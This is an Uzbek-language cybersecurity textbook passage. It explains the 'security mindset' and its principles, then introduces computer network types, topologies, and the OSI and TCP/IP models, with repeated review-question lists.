Kiberxavfsizlik mutaxassislarida tez-tez tilga olinadigan sifatlardan biri “xavfsizlik tafakkuri” deb ataladi. Bu kiberxavfsizlik faoliyati uchun foydali deb hisoblangan muayyan fikrlash usuli bo‘lib, u atrofdagi tizimlarda doimo zaifliklarni izlashga moyillikni o‘z ichiga oladi. Xavfsizlik bo‘yicha mutaxassis bo‘lish xavfsizlik tafakkuriga ega bo‘lish uchun na zarur, na yetarli shart ekani ta’kidlansada, biroq soha vakillarining aytishlaricha, ular xodim yollashda aynan xavfsizlik tafakkuriga ega bo‘lganlarni izlaydi va o‘z xodimlarida uni shakllantirishga harakat qiladi. Bir nechta kiberxavfsizlik ta’lim dasturlari ham ushbu masalaga e’tibor qaratgan va u aksariyat rasmiy kiberxavfsizlik o‘quv standartlariga kiritilgan.
Xavfsizlik tafakkuri nima uchun muhim?
Bugungi kunda hujumchilar avtomatlashtirilgan skanerlar, AI yordamiga asoslangan vositalar, ijtimoiy muhandislik taktikalari, eski, xavfsizlik yechimi o‘rnatilmagan zaifliklar, nollik-kun (zero-day) zaifliklari orqali tizimlardan ruxsatsiz foydalanishmoqda. Agar himoyachi yoki mutaxassislarda xavfsizlik tafakkuri bo‘lmasa, ular tahdidlarni kech aniqlaydi, hujum payti qanday javob qaytarishni bilmaydi, muammolarni yuzaki ko‘radi, himoya choralari taktik emas, balki formal bo‘lib qoladi. Boshqa tomondan, agar mutaxassis xavfsizlik tafakkuriga ega bo‘lsa, hujumchi kabi fikrlaydi (“Bu yerda nima buziladi?”), hujumni oldindan sezadi, zaifliklarni hisobga olib loyihalashni amalga oshiradi, har bir tizimda “eng yomon holat ssenariylarini” ko‘ra oladi va shunga mos himoya mexanizmlarini puxta quradi.
Xavfsizlik tafakkurining asosiy tamoyillari
Axborot xavfsizligi tafakkur quyidagi asosiy tamoyillar asosida shakllantiriladi:
	•	Nima noto‘g‘ri bo‘lishi mumkin (What could go wrong)? - Har qanday tizim, jarayon yoki foydalanuvchi harakatini tahlil qilayotganda birinchi savol shu bo‘lishi lozim. Masalan, “Parolni tiklash tizimi bor. Uni qanday qilib obro‘sizlantirish (aylanib o‘tish) mumkin?”
	•	Hujumchi kabi fikrlash (Adversarial thinking): ya’ni, tizimni buzish uchun yo‘l izlash, cheklovlar atrofidan aylanib o‘tish, eng zaif bo‘g‘inni topish, kutilmagan joydan hujum qilish, standart qoidalarga amal qilmaslik va hk. tarzda fikrlash.
	•	Himoyachi kabi fikrlash (Defensive Thinking): ya’ni, tizimni sathlarga asoslangan himoya mexanizmlari bilan loyihalaydi, xatoliklarni minimal darajaga tushiradi, monitoringni doimiy amalga oshiradi, “agar buzilsa nima bo‘ladi?” degan ssenariylarga oldindan javob tayyorlaydi.
	•	Tizim allaqachon buzilgan deb faraz qilish (Assume Breach): ushbu tamoyilga ko‘ra mutaxassis o‘ziga “Agar ichki tarmoqqa zararli kod kirsa nima bo‘ladi?”, “Hujumchi foydalanuvchi bo‘lib ko‘rinsachi?”, “Agar admin huquqlari o‘g‘irlansachi?” kabi savollarni berib, tizimning “eng yomon holatga” tayyorligiga ishonch hosil qiladi.
	•	Aktivlaringni bil (Know Your Assets): Himoya qilish uchun avvalo nimalarni himoyalash kerakligini bilish zarur: qurilmalar, serverlar, ma’lumotlar, foydalanuvchilar, tarmoq oqimlari, tashqi resurslar va hk. Tizim qanchalik katta bo‘lsa, aktivlar ham shuncha ko‘p bo‘ladi. Mazkur holda xavfsizlik tafakkuri ularni boshqarish imkonini beradi.
	•	Tahdidlarni modellashtirish (Threat Modeling): xavfsizlik tafakkurining asosi bu tahdidlarni modellashtirishdir. Xususan, tahdidni modellashtirish hujumchilar turlarini aniqlashga, hujum yo‘llarini chizishga, zaifliklarni tahlil qilishga, ustuvor himoya choralarini belgilashga imkon beradi.
Xavfsizlik tafakkurini shakllantirish usullari
Xavfsizlik tafakkurini shakllantirishda odatda quyidagi usullardan keng foydalaniladi:
Real hujum ssenariylarini tahlil qilish: mashhur kiberhujumlar: WannaCry, SolarWinds, Facebook Data Breach, Equifax breach kabilarni tahlil qilish asosida “hujumchi nimani ko‘rdi” degan savolga javob beriladi.
CTF (Capture The Flag) musobaqalari: bu musobaqalarda zaiflikni topish, hujumni amalga oshirish, teskari injiniring, kriptografik himoyani buzish, tarmoqni snifferlash kabi vazifalar bajariladi. Bu xavfsizlik tafakkurini juda yaxshi rivojlantiradi.
“Red Team vs Blue Team” mashqlari: O‘quvchilar ikki: Red Team (hujumchilar) → tizimga hujum qiluvchi, Blue Team (himoyachilar) → himoya qiluvchi, loglarni tahlil qiluvchi guruhlarga ajratilgan holda kurashadilar. O‘quvchilar bir guruhdan boshqasiga o‘tib turishi yanada foydali bo‘ladi.
Dastur kodini xavfsizlik nuqtai nazaridan ko‘rish: xavfsizlik tafakkuriga ega dasturchi: kirish qiymatni joizligini tekshirishni unutmaydi, inyeksiyalardan himoyalanadi, autentifikatsiya jarayonini ishonchli qiladi, zaif API yaratmaydi. 
Har bir jarayonni chuqur tahlil qilish (Think step-by-step): har bir jarayonni qadamma-qadam tahlil qilish orqali zaiflikni topishga xizmat qilinadi. Masalan, Parol qayerda saqlanadi? → Parol xeshlanadimi? → Xesh algoritmi qaysi? → Salt bormi? → Pepper ishlatiladimi? kabi savollarga javob berish orqali parolni bilan bog‘liq jarayonni chuqur tahlil qilish mumkin.

Misollar
1. Wi-Fi tarmog‘i
Oddiy foydalanuvchi: “Wi-Fi paroli bor, demak xavfsiz.”
Xavfsizlik tafakkuriga ega foydalanuvchi: WPA2 zaifmi? Kriptografik parametrlar to‘g‘rimi? Routerning admin paroli o‘zgartirilganmi? WPS o‘chirilganmi? MAC manzili bo‘yicha filterlash yoqilganmi? Tarmoq segmentatsiyasi amalga oshirilganmi?
2. Web-sayt login formasi
Oddiy ooydalanuvchi: “Login parol kiritish uchun.”
Xavfsizlik tafakkuriga ega foydalanuvchi: SQL inyeksiya zaifligi bormi? Kiritish chastotasi bo‘yicha cheklov mavjudmi? Parolni tiklash qanday ishlaydi? XSS orqali kukini o‘g‘irlash mumkinmi?  Sessiya uchun ishlash vaqti (Session time-out) o‘rnatilganmi? 
Xulosa qilib aytganda, xavfsizlik tafakkuriga ega foydalanuvchi zaifliklarni topish, zaifliklarni sinab ko‘rish (pentest), himoya strategiyalarini ishlab chiqish, tahdidlarni oldindan ko‘rish, hujum va himoya texnikalarini uyg‘unlashtirish, real tizimlarni xavfsiz loyihalash ko‘nikmalariga ega bo‘ladi.
	Xavfsizlik tafakkuri nima?
	•	Amerikalik axborot xavfsizligi mutaxassisi Bryus Shnayer xavfsizlik haqida nima fikr bildirgan?
	•	Xavfsizlik tafakkuri nima uchun muhim?
	•	Xavfsizlik tafakkurining asosiy tamoyillarini ayting?
	•	Himoyachi kabi fikrlash nima uchun kerak?
	•	Xavfsizlik tafakkurini shakllantirish usullarini ayting?
	•	CTF (Capture The Flag) musobaqalari haqida ayting?
	•	Xavfsizlik tafakkuriga ega va ega bo‘lmagan foydalanuvchilarni bir birdan farqlovchi holatlarga misol keltirng.

Nazorat savollari

	•	Xavfsizlik tafakkuri nima?
	•	Amerikalik axborot xavfsizligi mutaxassisi Bryus Shnayer xavfsizlik haqida nima fikr bildirgan?
	•	Xavfsizlik tafakkuri nima uchun muhim?
	•	Xavfsizlik tafakkurining asosiy tamoyillarini ayting?
	•	Himoyachi kabi fikrlash nima uchun kerak?
	•	Xavfsizlik tafakkurini shakllantirish usullarini ayting?
	•	CTF (Capture The Flag) musobaqalari haqida ayting?
	•	Xavfsizlik tafakkuriga ega va ega bo‘lmagan foydalanuvchilarni bir birdan farqlovchi holatlarga misol keltirng.

Nazorat savollari

II BOB. KOMPYUTER TARMOQLARI VA INTERNET XAVFSIZLIGI


II BOB. KOMPYUTER TARMOQLARI VA INTERNET XAVFSIZLIGI





Ta’lim maqsadlari:
−	kompyuter tarmoqlarining asosiy tushunchalari (IP, DNS, MAC, marshrutizator, paket)ni ta’riflaydi va ularning vazifalarini tushuntiradi;
−	OSI va TCP/IP modellari sathlarini taqqoslaydi hamda har bir qatlamda yuzaga kelishi mumkin bo‘lgan hujum turlarini izohlaydi;
−	Wireshark yordamida tarmoq paketlarini kuzatadi, asosiy protokollarni aniqlaydi va tahlil qiladi;
−	ping va traceroute buyruqlari orqali internetda ma’lumot uzatish yo‘nalishlarini vizual tarzda aniqlaydi va izohlaydi;
−	IPv4 va IPv6 manzillash, subnet maskalar va tarmoq segmentatsiyasini tushuntiradi va amaliy misollar bilan ko‘rsatadi;
−	lokal tarmoqda statik va dinamik IP sozlamalarini mustaqil sozlaydi va ularning farqlarini tahlil qiladi;
−	firewall (tarmoqlararo ekranlari) ishlash prinsiplarini tushuntiradi hamda Windows/Linux muhitida oddiy firewall qoidalarini yaratadi;
−	VPN va tarmoq darajasidagi shifrlash tushunchalarini izohlaydi, VPN ulanishini sozlaydi va shifrlangan trafikni tahlil qiladi;
−	oddiy tarmoq skanerlash va hujum ssenariylarini modellashtiradi, aniqlangan xavflarga qarshi himoya choralarini taklif etadi.
Bobni o‘zlashtirish uchun tavsiya etiladigan qo‘shimcha kurslar:
1. Tarmoq texnologiyalari asoslari (Основы сетевых технологий) - https://www.coursera.org/learn/akamai-networking
2. Tarmoq xavfsizligi (безопасность сети) - https://www.coursera.org/learn/-network-security
2-bob haqida umumiy ma’lumot
Mazkur bobda tarmoq tushunchasi, uning turlari, tarmoq topologiyalari, OSI va TCP/IP modellari, tarmoq qurilmalari va ularning vazifalari, tarmoqning turli sathlarida xavfsizlik muammolari, IPv4 va IPv6 tarmoq protokoli, IP manzil guruhlari, tarmoqda axborot xavfsizligini ta’minlash vositalari: tarmoqlararo ekran va virtual xususiy tarmoq, ularni vazifalari, turlari, ulardan amalda foydalanish kabi masalalar nazariy va amaliy jihatidan tushuntiriladi.
2.1.  Tarmoq asoslari  (Ma’ruza mashg‘uloti)
Tarmoq tushunchasi, uning turlari. 
	•	Tarmoq topologiyalari. 
	•	OSI va TCP/IP modellari: har bir sathning vazifasi, har bir sath uchun muhim parametrlar.
Reja:
	•	Tarmoq tushunchasi, uning turlari. 
	•	Tarmoq topologiyalari. 
	•	OSI va TCP/IP modellari: har bir sathning vazifasi, har bir sath uchun muhim parametrlar.
Reja:


Mijoz-server, tarmoq turlari, tarmoq topologiyalari, OSI modeli, TCP/IP modeli, TCP/UDP protokoli, IP protokoli, MAC manzil.
Kalit so‘zlar:
Mijoz-server, tarmoq turlari, tarmoq topologiyalari, OSI modeli, TCP/IP modeli, TCP/UDP protokoli, IP protokoli, MAC manzil.
Kalit so‘zlar:
Tarmoq tushunchasi, uning turlari
Kompyuter tarmoqlari resurslarni almashish maqsadida bir necha kompyuterlarning birlashuvi bo‘lib, fayllar, dasturlar, printerlar, modemlar va har qanday tarmoq uskunasi birgalikda foydalaniluvchi yoki taqsimlanuvchi resurslar bo‘lishi mumkin. Kompyuterlarni birlashtirish uchun ma’lumotlarni uzatuvchi turli xil vositalardan foydalaniladi: aloqa kanallari, telekommunikatsiya vositalari, retranslyatorlar va hk.
Mos tarmoq servislaridan foydalanish orqali turli xil tarmoq resurslarini taqdim etish vazifasi yuklatilgan tarmoq kompyuteri server deb ataladi. Tarmoq resurslaridan va turli tarmoq servislaridan foydalanish maqsadida serverga so‘rov yuboruvchi tarmoq qurilmalari mijozlar deb ataladi. Avtonom ishlovchi yoki mijoz sifatida tarmoqqa ulangan kompyuterni, odatda, ishchi stansiyasi deb atashadi. 
Kompyuter tarmoqlarini quyidagicha tasniflash mumkin:
	•	xududiy alomat bo‘yicha;
	•	ma’murlash usuli bo‘yicha;
	•	topologiya bo‘yicha.
Hududiy alomat bo‘yicha lokal (LAN, Local Area Network) va global (WAN, Wide Area Network) hisoblash tarmoqlari farqlanadi. 
Lokal hisoblash tarmog‘i katta bo‘lmagan hududda, xonada yoki binoda joylashgan kompyuter tarmog‘idan iborat. Lokal tarmoq o‘lchami tarmoq texnik arxitekturasi va ulash xiliga (kabel turiga) bog‘liq. Odatda lokal hisoblash tarmog‘ining diametri 2,5 kmdan oshmaydi. 
Global hisoblash tarmog‘i katta geografik muhitni qamrab olgan va tarkibida aloqaning magistral liniyalari yordamida birlashtirilgan ko‘plab hisoblash tarmoqlari va masofadagi kompyuterlar bo‘lgan hududiy taqsimlangan tizimdan iborat. Megapolis va region doirasida tashkil etilgan tarmoqlar mos holda shahar tarmog‘i (MAN, Metropolitan Area Network) va regional tarmoq (PAN, Personal Area Network) deb yuritiladi. Eng mashhur global tarmoq Internet TCP/IP protokollari steki bazasiga asoslangan megatarmoq hisoblanadi. Ba’zi adabiyotlarda “korporativ tarmoq” iborasi ishlatiladi. Bu ibora orqali turli texnik, dasturiy va informatsion tamoyillarda qurilgan bir necha tarmoqlarning birlashmasi tushuniladi. 
Megatarmoq Internet foydalanuvchilarini birlashtirish uchun ishlatiluvchi global tarmoq Ekstranet (extranet) deb yuritiladi. TCP/IP protokoli bazasida amalga oshirilgan, ammo megatarmoq Internetdan ajratilgan tarmoq Intranet (Intranet) deb ataladi. 
Ma’murlash usuli bo‘yicha tarmoqlar “bir rutbali (одноранговый)” va “mijoz serverli” turlariga bo‘linadi. Bir rutbali tarmoqlarda barcha kompyuterlar ham mijoz, ham server bo‘lishi mumkin. UNIX tarmoqlari bunga misol bo‘ladi.
Mijoz-server texnologiyasi bo‘yicha qurilgan tarmoqlarda maxsus ajratilgan server mavjud. Ajratilgan serverlarga quyidagilar misol bo‘la oladi: fayl server, chop etish (print) serveri, ilovalar serverlari.
Ro‘yxatga olish serverlari (domenlar kontrollerlari), web serverlar, elektron pochta serverlari, masofadan foydalanish serverlari, terminal serverlar, telefon serverlar, proksi serverlar va hk.
“Mijoz-server” tarmoqlarida markazlashgan arxitektura hisobiga ma’murlash va masshtablash funksiyalarini, xavfsizlikni va tiklanishni ta’minlash osongina amalga oshiriladi. Ammo, bunday tarmoqlarning zaif joyi (barcha markazlashgan tizimlardagi kabi) server hisoblanadi. Serverning buzilishi butun tizimning ishdan chiqishiga olib keladi. Undan tashqari, “mijoz-server” tarmoqni qurish uchun server kompyuter va mos operatsion server muhiti talab etiladi. Mos holda, bunday tarmoqlar professional tarmoq ma’muriga ega bo‘lishi shart.
Tarmoq topologiyalari
Kompyuter tarmog‘ining topologiyasi (joylashtirilishi, tuzilishi, tarkibi) deganda odatda biz bir-biriga nisbatan kompyuterlar tarmoqda joylashganligi va aloqa yо‘llarini ulash usullarini tushunamiz. Muhumi shundaki topologiya tushunchasi avvalam bor lokal tarmoqlargagina tegishlidir, chunki bu tarmoqlarda aloqaning tuzilishini osongina kuzatish imkoni mavjud.
Global tarmoqlarda esa aloqaning tuzilishi foydalanuvchidan berkitilgan va bilish juda ham muhim emas, chunki har bir ulanish о‘zining alohida yо‘li bilan amalga oshirilishi mumkin.
Tarmoq topologiyasi qurilmalariga qо‘yiladigan talablarni, ishlatiladigan kabel turini, axborot almashishning bо‘lishi mumkin bо‘lgan va eng qulay boshqarish usulini, ishonchli ishlashini, tarmoqni kengaytirish imkoniyatini belgilaydi. Foydalanuvchida har doim ham tarmoq topologiyasini tanlash imkoniyati bо‘lmasada, asosiy topologiyalarning xususiyatlarini, afzallik va kamchiliklarini, hamma bilishi lozim.
Tarmoq topologiyasi bo‘yicha umumiy shinali (bus), xalqasimon (ring), yulduzsimon (star), uyali (mesh) va aralash topologiyali tarmoqlar farqlanadi. “Umumiy shina” topologiyasi bitta chiziq bo‘yicha yotqizilgan tarmoqdan iborat. Kabel bitta kompyuterdan keyingi kompyuterga, so‘ngra undan keyingisiga o‘tadi (2.1-rasm).

2.1-rasm. “Umumiy shina” topologiyasi
Shinaning har bir uchida terminator (signalning akslanishini istisno qiluvchi) bo‘lishi lozim. Shinaning bir uchi yerga ulanishi kerak. Shinali topologiya “passiv” hisoblanadi, chunki kompyuterlar signallarni regeneratsiyalamaydi. Signal so‘nishi muammosini hal etishda tarkorlagichlardan foydalaniladi. Shinaning uzilishi butun tarmoq ishlashining buzilishiga sabab bo‘ladi (signalning akslanishi hisobiga). Tizimning fizik sathida axborotning sust himoyalanganligini aytish lozim. Chunki, bir kompyuterning ikkinchi kompyuterga yuborgan xabari boshqa ixtiyoriy kompyuterda qabul qilinishi mumkin.
“Xalqasimon” topologiyada har bir kompyuter boshqa ikkita kompyuter bilan ulangan va signal aylana bo‘yicha o‘tadi (2.2-rasm). 

2.2-rasm. “Xalqasimon” topologiya
Xalqasimon topologiya “aktiv” hisoblanadi, chunki har bir kompyuter keyingi kompyuterga signal regeneratsiyalaydi. Topologiyaing kamchiligi sifatida masshtablashning murakkabligini hamda umumiy shina topologiyasidagidek uzilish sodir bo‘lganida tarmoqning ishdan chiqishini va axborotning sust himoyalanganligini ko‘rsatish mumkin.
“Yulduzsimon” topologiya har bir kompyuterni markaziy konsentrator bilan ulash orqali tashkil etiladi (2.3-rasm). 

2.3-rasm. “Yulduzsimon” topologiya
Ushbu topologiyaning afzalligi uzilishlarga barqarorligi (faqat bitta kompyuter uziladi), kompyuterlarni qo‘shish imkoniyatining kamchiligi sifatida konsentratorga xarajatni ko‘rsatish mumkin. 
“Uyali” topologiyada har bir kompyuter boshqalari bilan ulangan. Shu tufayli ulanishlarning uzilishiga eng yuqori barqarorlikka erishiladi. Topologiyaning kamchiligi sifatida kabelli ulanishlarga xarajatni ko‘rsatish mumkin. 
Ta’kidlash lozimki, topologiya fizik va mantiqiy bo‘lishi mumkin. Fizik topologiya kabel yotqiziladigan yo‘lni, mantiqiy topologiya esa signal o‘tadigan yo‘lni ko‘zda tutadi. Masalan, Token Ring arxitektura fizik nuqtai nazardan yulduzsimon topologiyani ifodalasa, mantiq nuqtai nazariyadan xalqasimon topologiyani ifodalaydi.
OSI va TCP/IP modellari: har bir sathning vazifasi, har bir sath uchun muhim parametrlar
Tarmoqqa qo‘yiladigan talablar:
	•	ochiqlilik – tarmoqning mavjud komponentlarining texnik va dasturiy vositalarini o‘zgartirmay qo‘shimcha abonent kompyuterlarini hamda aloqa liniyalarini (kanallarini) kiritish imkoniyati;
	•	moslashuvchanlik – kompyuterni yoki aloqa liniyalarini ishdan chiqishi natijasida struktura o‘zgarishining ishga layoqatlikka ta’sir etmasligi;
	•	samaradorlik – kam sarf-xarajat evaziga foydalanuvchilarga xizmat qilishning talab etiladigan sifatini ta’minlash.
Tarmoq – turli uskunalarning birlashmasi, demak ularni birgalikda ishlatish muammosi jiddiy muammolardan hisoblanadi. Ishlab chiqaruvchilarning uskuna qurilishidagi umumiy qoidalarga rioya qilmaslaridan turli tarmoqlarni qurishda rivojlanishga erishish mumkin emas. Shu sababli kompyuter sohasidagi yuksalishlar standartlarda akslanadi. Boshqacha aytganda, har qanday texnologiya, uning mazmuni standartlarda o‘z aksini topganidagina “qonuniy” himoyaga ega bo‘ladi. 
1980 – yilning boshlarida standartlashtirish bo‘yicha qator tashkilotlar tomonidan yaratilgan model tarmoqlar rivojida muhim rol o‘ynadi. Bu model ochiq tizimlarning o‘zaro aloqa modeli (Open System Interconnection) yoki OSI modeli deb yuritiladi. OSI modeli tizimlarning o‘zaro aloqasining turli sathini belgilaydi, ularga standart nomlar beradi va har bir sathning qanday vazifalarni bajarishini ko‘rsatadi. Ushbu modelning talablariga muvofiq tarmoqning har bir tizimi ma’lumotlar kadrini uzatish orqali o‘zaro aloqada bo‘lishlari lozim. OSI modeliga binoan kadrlarni hosil qilish va uzatish 7 ta ketma-ket harakatlar yordamida amalga oshiriladi (2.4-rasm). Bu harakatlar “ishlash sathlari” nomini olgan. 

2.4-rasm. Axborotning OSI modeli bo‘yicha abonetdan abonentga o‘tish yo‘li
Ushbu modelning asosiy g‘oyasiga muvofiq har bir sathga aniq vazifa yuklanadi. Natijada ma’lumotlarni uzatish masalasi osongina ko‘zga tashlanadigan alohida masalalarga ajratiladi. OSI modelida o‘zaro aloqa vositalari yettita sathga bo‘linadi: tatbiqiy, taqdimiy, seans, transport, tarmoq, kanal va fizik. Har bir sath tarmoq qurilmalari orasidagi aloqaning ma’lum sathi bilan ish ko‘radi.
Quyida barcha bosqich vazifalari batafsil kо‘rib chiqiladi: 
	•	Tadbiqiy sath (Application, прикладной уровень) yoki ilovalar sathi, u quyidagi xizmatlarni amalga oshiradi: foydalanuvchining ilovasini shaxsan tasdiqlaydi, masalan, fayllar uzatishning dasturiy vositalari, axborot bazasiga ega bо‘lish, elektron pochta vositalari, serverda qayd qilish xizmati. Bu sath qolgan 6 ta bosqichni boshqaradi. Ushbu sathda HTTP, FTP, SSH, Telnet, DNS kabi protokollardan foydalaniladi, unda ishlanuvchi xabarlar ma’lumot deb ataladi. Ushbu sathda tarmoqdan kelgan ma’lumot ilovalarga olib kelinadi, ilovadan chiqqan ma’lumotlar esa tarmoqqa olib chiqiladi.
	•	Taqdimiy sath (Presentation, презентативный уровень) yoki axborotni tanishtirish bosqichi, bu bosqichda axborot aniqlanadi va axborot formatini kо‘rinish sintaksisini tarmoqqa qulay ravishda о‘zgartiradi, ya’ni tarjimon vazifasini bajaradi. Shu yerda axborot shifrlanadi va deshifrlanadi, lozim bо‘lgan taqdirda ularni zichlashtiriladi. Ushbu sathda HTML, MPEG, JPEG, IMAP, TLS kabi protokollardan foydalanilib, unda ishlanuvchi xabarlar ma’lumot deb ataladi. Ushbu sathda ma’lumotlarni ajratish amalga oshiriladi.
	•	Seans sathi (Session, сеансовый уровень) aloqa о‘tkazish vaqtini boshqaradi (ya’ni aloqani о‘rnatadi, tasdiqlaydi va tamomlaydi). Bu sathda abonentlarni mantiqiy nomlarini tanish, ularga ega bо‘lish huquqini nazorat qilish vazifalari ham bajariladi. Ushbu sathda Socket, Winsock, API kabi protokollar foydalanilib, unda ishlanuvchi xabarlar ma’lumot deb ataladi. Ushbu sathda tomonlar o‘rtasida sessiya o‘rnatiladi va tugatiladi.
	•	Transport sath (Transport, транспортный уровень) paketni xatosiz va yо‘qotmasdan, kerakli ketma-ketlikda yetkazib berishni amalga oshiradi. Shu yerda yana uzatilayotgan axborotni paketga joylash uchun bloklarga taqsimlanadi va qabul qilingan axborotni qayta tiklanadi. Ushbu sathda TCP, UDP kabi protokollar foydalanilib, unda ishlanuvchi xabarlar segment (TCP uchun)/ datagram (UDP uchun) deb ataladi. Ushbu sathdagi ma’lumotlarga port manzili sarlavha sifatida biriktiriladi va tomonlar o‘rtasida nuqtadan-nuqtaga ko‘rinishidagi bog‘lanish o‘rnatiladi.
	•	Tarmoq sath (Network, сетевой уровень) - bu sath paketlarni manzillash, mantiqiy nomlarni fizik tarmoq manziliga о‘zgartirish, teskariga ham va shuningdek, paketni kerakli abonentga jо‘natish yо‘nalishini tanlashga (agarda tarmoqda bir necha yо‘nalish mavjud bо‘lsa) javobgar. Ushbu sathda IPv4, IPv6, ICMP, IPsec, IGMP kabi protokollar foydalanilib, unda ishlanuvchi xabarlar paket deb ataladi. Ushbu sathdagi ma’lumotlarga qurilmaning mantiqiy manzili sarlavha sifatida (Internet protocol, IP) biriktiriladi.
	•	Kanal sath yoki uzatish yо‘lini boshqarish sathi (data link), bu sath standart kо‘rinishdagi paket tuzishga va boshlash hamda tamom bо‘lishni boshqarish maydonini paket tarkibiga joylashishiga javobgardir. Shu yerda yana tarmoqqa ega bо‘lishni uzatishdagi xatoliklar aniqlanadi va yana qabul qilish qurilmasiga xato uzatilgan paketlarni qaytadan uzatishni boshqarish amalga oshiriladi. Ushbu sathda 802.3 Ethernet, 802.11 Wireless, PPP, HDLC kabi protokollar foydalanilib, unda ishlanuvchi xabarlar freym deb ataladi. Ushbu sathdagi ma’lumotlarga qurilmaning fizik manzili sarlavha sifatida (Media access control, MAC) biriktiriladi.
	•	Fizik sath (Physical, физический уровень) – bu modelni eng quyi sathi bо‘lib, uzatilayotgan axborotni signal kattaligiga kodlashtiradi, uzatish muhitiga qabul qilishni va teskari kodlashni amalga oshirishga javob beradi. Shu yerda yana ulanish moslamalariga, razyomlarga, elektr bо‘yicha moslashtirish va yerga ulanish hamda tо‘siqlardan himoya qilish va hk.ga talablar aniqlanadi. Ushbu sathda 100Base-FX, 1000Base-LW, RS-232, DSL kabi protokollardan foydalanilib, unda ishlanuvchi xabarlar bitlar deb ataladi. Ushbu sathda ma’lumotlar signal va binar ko‘rinishda uzatiladi.
Faraz qilaylik, ilova so‘rov bilan tatbiqiy sathga, masalan, fayl xizmatiga murojaat etsin. Ushbu so‘rovga binoan tatbiqiy sathning dasturiy ta’minoti axborotning standart formatini shakllantiradi. Oddiy axborot sarlavha va ma’lumotlar xoshiyasidan iborat bo‘ladi. Axborot shakllanganidan so‘ng tatbiqiy sath uni pastga-taqdimiy sathga uzatadi. Taqdimiy sathning protokoli tatbiqiy sathning sarlavhasidan olingan axborotga asosan talab qilingan harakatlarni bajaradi va ma’lumotga o‘zining xususiy xizmat axborotini-taqdimiy sathning sarlavhasini qo‘shadi. Natijada olingan axborot pastga-seans sathiga uzatiladi. Seans sathning protokoli taqdimiy sathning sarlavhasidan olingan axborotga asosan talab qilingan harakatlarni bajaradi va ma’lumotga o‘zining xizmat axborotini – seans sathning sarlavhasini qo‘shadi. Bu sarlavhada mashina adresatining seans sathi protokoli uchun ko‘rsatmalar bo‘ladi. Natijada olingan axborot pastga, transport sathiga uzatiladi. Transport sathi o‘z navbatida o‘zining sarlavhasini qo‘shadi. Nihoyat, axborot pastki – fizik sathga yetib boradi. Fiziq sath o‘zining sarlavhasini qo‘shib, axborotni mashina adresatiga aloqa liniyalari orqali uzatadi. Bu paytga kelib, axborot barcha sath ilovalariga “o‘sadi”. Axborot mashina-adresatiga yetib kelganidan so‘ng yuqoriga qarab sathlar bo‘yicha ko‘chiriladi. Har bir sath, ushbu sathga mos vazifalarni bajargani holda, o‘z sathi sarlavhasini tahlillaydi va ishlatadi. So‘ngra bu sarlavhani chiqarib tashlab, axborotni yuqori sathga uzatadi (2.5-rasm).

2.5-rasm. OSI modelida xabarlarni harakatlanish tartibi
OSI modelida protokollarning ikki xili farqlanadi. Ulanishni o‘rnatishli (connection oriented) protokollarida ma’lumotlarni almashishdan avval uzatuvchi va qabul qiluvchi ulanishni o‘rnatishi va ehtimol, ma’lumotlar almashishida ishlatiladigan protokolning ba’zi parametrlarini tanlashi lozim. Muloqot tugaganidan so‘ng ular ulanishni uzib tashlashlari lozim. Ulanishni o‘rnatishga asoslangan o‘zaro aloqaga misol sifatida telefonni ko‘rsatish mumkin.
Protokollarning ikkinchi guruhi – oldindan ulanishni o‘rnatishsiz (connection less) protokolidir. Bunday protokollarni datagrammali  protokollar ham deb yuritiladi. Uzatuvchi axborotni u tayyor bo‘lganida uzatadi. Oldindan ulanishni o‘rnatishsiz aloqaga misol sifatida xatni pochta qutisiga tashlashni ko‘rsatish mumkin. Kompyuterlarning uzaro aloqasida protokollarning ikkala xili ishlatiladi.
TCP/IP modeli
TCP/IP modeli — tarmoq sohasida OSI modelidan keyin yana bir muhim bo‘lgan namunaviy model hisoblanadi. OSI modeli yetti sathli model bo‘lsa, TCP/IP modeli to‘rt sathli yoki besh sathli modeldir. To‘rt sathli model dastlabki ko‘rinish bo‘lsa, hozirgi zamonaviy ko‘rinishi - bu besh sathli TCP/IP modelidir. Umuman olganda, ikkala model ham bir xil jarayonni tasvirlaydi, ammo ularning sathlar chegaralari bir-biridan farq qiladi. 2.6-rasmda ushbu modellarning ifodasi keltirilgan.

2.6-rasm. OSI, TCP/IP (4 sathli) va TCP/IP (5 sathli) modellar
OSI modeli — bu ma’lumotlarni inkapsulyatsiyalash jarayonini yetti sathga ajratadigan nazariy model. Har bir sath xabarga qo‘shiladigan ma’lumotlarni alohida sarlavha (header) sifatida tasvirlaydi. OSI modeli hali ham tarmoqlarni o‘qitishda va protokollarning qanday ishlashini tushuntirishda keng qo‘llanilsada (hattoki Cisco kompaniyasi OSI modelini CCNA/CCNP imtihonlariga kiritgan bo‘lsada), real tarmoq muhandisligi amaliyotida bu modelning chuqur tafsilotlarini bilish unchalik foydali emas. Boshqacha aytganda, aynan birinchi to‘rt sath tarmoq muhandislari uchun eng ahamiyatli sathlardir. Shu bois, tarmoq muhandisligi amaliyotlarida OSI modelidan ko‘ra TCP/IP modellaridan keng foydalaniladi.
	Kompyuter tarmog‘i va uning turlarini ayting?
	•	Tarmoq topologiyalari va ularning turlari?
	•	Umumiy shina topologiyani tushuntiring?
	•	Xalqasimon topologiyani tushuntiring?
	•	Yulduzsimon topologiyani tushuntiring?
	•	Tarmoqning OSI modeli va uning sathlarining vazifalarini tushuntiring?
	•	Tarmoqning TCP/IP modeli va uning sathlarining vazifalarini tushuntiring?
Nazorat savollari

	•	Kompyuter tarmog‘i va uning turlarini ayting?
	•	Tarmoq topologiyalari va ularning turlari?
	•	Umumiy shina topologiyani tushuntiring?
	•	Xalqasimon topologiyani tushuntiring?
	•	Yulduzsimon topologiyani tushuntiring?
	•	Tarmoqning OSI modeli va uning sathlarining vazifalarini tushuntiring?
	•	Tarmoqning TCP/IP modeli va uning sathlarining vazifalarini tushuntiring?
Nazorat savollari
2.2. Tarmoq qurilmalari va xavfsizlik muammolari
(Ma’ruza mashg‘uloti)

Tarmoq qurilmalari: tarmoq kabeli, hab, repetir, tarmoq kartasi, ko‘prik, switch, router, gateway. 
	•	Tarmoq xavfsizligi muammolari. 
Reja:
	•	Tarmoq qurilmalari: tarmoq kabeli, hab, repetir, tarmoq kartasi, ko‘prik, switch, router, gateway. 
	•	Tarmoq xavfsizligi muammolari. 
Reja:

